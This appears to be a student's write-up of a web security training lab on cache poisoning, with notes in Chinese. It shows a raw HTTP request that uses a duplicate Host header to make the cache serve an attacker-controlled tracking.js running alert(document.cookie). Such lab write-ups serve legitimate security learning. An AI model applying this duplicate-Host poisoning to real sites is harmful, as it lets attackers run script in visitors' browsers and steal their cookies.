# Lab: Web cache poisoning via ambiguous requests

This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page.

To solve the lab, poison the cache so the home page executes alert(document.cookie) in the victim's browser.

## HTTP Host Header Attack
* 題目說要用快取污染的方式造成 XSS，稍微看一下可以看到其中一個 header 是 `X-Cache: miss` 指的是會從 host 抓快取，如果我們把 host 改一下，如果改成 exploit 的 host 會發現噴 503，在下面新增一個 host 就可以經過 exploit server，之後我們看一個 file 是 tracking.js，在 exploit server 那邊稍微設定一下，把 .js 的內容改成 `alert(documnet.cookie)`，又題目說要在根目錄的地方造成污染，所以改一下
```
GET / HTTP/1.1
Host: ac2b1f561e50e86cc0682151000e0097.web-security-academy.net
Host: exploit-ac281fa81e76e87fc0b8219501e400ae.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5 (Ergänzendes Update)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _lab=46%7cMCwCFC0C%2bQAAB0w87auei0j21mDP36wlAhQYQ0foLipsjGlBtPHmOp1gER5Hex8pItiKFAlqkZfd2sOqFAo2slRCPJSazVIG3DkqWVxKujI8Pc1TbpOQHkMBobuteYDF6uqGY1uv0TRyOi547xk77QBnS96AZNwOMc84p6uqiVtdR3Q%3d; session=chkTanBlL9mAE0S0Nmhq8giyRODrdUgv
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 127.0.0.1
Cache-Control: max-age=0


```